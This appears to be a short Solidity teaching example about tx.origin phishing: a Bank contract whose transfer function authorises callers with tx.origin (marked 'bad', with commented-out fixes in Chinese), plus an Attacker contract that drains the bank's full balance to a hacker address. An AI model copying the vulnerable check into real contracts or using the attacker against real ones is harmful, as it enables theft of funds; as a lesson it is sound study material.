// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

contract Bank {

    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address _to, uint256 _amount) external {
        // bad
        require(owner == tx.origin, "must owner");
        // good1 使用msg.sender代替tx.origin
        // require(owner == msg.sender, "must owner");
        // good2 再检验tx.origin == msg.sender
        // require(tx.origin == msg.sender, "must owner");
        (bool ok, ) = _to.call{value: _amount}("");
        require(ok, "call failed");
    }
}

contract Attacker {

    address public bank;

    address public hacker;

    constructor(address _bank, address _hacker) {
        bank = _bank;
        hacker = _hacker;
    }

    function attack() external {
        Bank(bank).transfer(hacker, bank.balance);
    }
}
